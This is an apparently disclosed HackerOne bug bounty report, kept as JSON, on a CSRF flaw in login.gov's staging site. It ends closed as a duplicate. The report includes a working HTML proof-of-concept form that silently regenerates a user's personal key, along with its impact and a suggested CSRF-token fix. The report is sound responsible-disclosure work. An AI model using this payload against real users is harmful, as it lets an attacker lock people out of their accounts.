{"id":263512,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjM1MTI=","url":"https://hackerone.com/reports/263512","title":"CSRF in generating a new Personal Key","state":"Closed","substate":"duplicate","severity_rating":"medium","readable_substate":"Duplicate","created_at":"2017-08-26T05:40:08.032Z","submitted_at":"2017-08-26T05:40:08.032Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"streaak","url":"/streaak","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":50592,"url":"https://hackerone.com/gsa_bbp","handle":"gsa_bbp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GSA Bounty","twitter_handle":null,"website":"http://gsa.gov","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-17T17:37:14.865Z","bug_reporter_agreed_on_going_public_at":"2017-11-02T08:14:55.012Z","team_member_agreed_on_going_public_at":"2017-11-17T17:37:14.549Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello team,\nI would like to report a CSRF which would allow an attacker to change a user's personal key.\n\n**Vulnerable URL-**\nstaging.login.gov\n\n**POC-**\n\nUse the following HTML form for performing the CSRF attack-\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://staging.login.gov/manage/personal_key\"\u003e\n      \u003cinput type=\"hidden\" name=\"resend\" value=\"true\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nThis will redirect you to https://staging.login.gov/manage/personal_key?resend=true and we can use the key on the screen to login as the old key will be rendered invalid.\n\nPS- The user doesn't have to click on continue on the above page. The key would be changed either way. You can logout and login and test the new key and you will be successfully logged into the account.\n\n**IMPACT-**\nThis will pretty much deny a user to login to his system who has \"his device stolen or accounts hacked\" as mentioned by your policy.\n\n**FIX-**\nAdd a CSRF token while submitting the form.\n\nLet me know if you need anything else.\n\nBest regards,\nStreaak2\n\n\n\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":263498,"original_report_url":"https://hackerone.com/reports/263498","attachments":[],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["jensec","gevakun","malcolmx","its_afolic"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1957397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @streaak2,\nThank you for the report. We are discussing this internally. We will get back to you once/when the review is complete. \nThanks!\n@rockyrobot","automated_response":false,"created_at":"2017-08-26T21:15:22.434Z","updated_at":"2017-08-26T21:15:22.434Z","actor":{"username":"rockyrobot","cleared":false,"url":"/rockyrobot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/256/061431018bdae2144e25297602c95722e8f2beed_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1968119,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @streaak2 - \n\nThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\n\nThanks!","automated_response":false,"created_at":"2017-08-31T07:53:29.519Z","updated_at":"2017-08-31T07:53:29.519Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969069,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi,\n\nThank you for your submission. Unfortunately, we received this report from another researcher. Your effort is appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nRegards.","automated_response":false,"created_at":"2017-08-31T16:15:49.447Z","updated_at":"2017-08-31T16:15:49.447Z","original_report_id":263498,"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2040631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, could you invite me to #263498 so that I can know the status of the report?\nThanks.\n","automated_response":false,"created_at":"2017-10-03T11:36:18.929Z","updated_at":"2017-10-03T11:36:18.929Z","actor":{"username":"streaak","cleared":true,"url":"/streaak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2123844,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since the original report has been disclosed. ","automated_response":false,"created_at":"2017-11-02T08:14:55.051Z","updated_at":"2017-11-02T08:14:55.051Z","first_to_agree":true,"actor":{"username":"streaak","cleared":true,"url":"/streaak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165849,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Happy to disclose, thanks for your work!","automated_response":false,"created_at":"2017-11-17T17:37:14.655Z","updated_at":"2017-11-17T17:37:14.655Z","actor":{"username":"jkm","cleared":false,"url":"/jkm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/876/892cc8dda2c24d00e8e963b81dd9ab51a0bc784c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165850,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-17T17:37:14.925Z","updated_at":"2017-11-17T17:37:14.925Z","actor":{"username":"jkm","cleared":false,"url":"/jkm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/876/892cc8dda2c24d00e8e963b81dd9ab51a0bc784c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}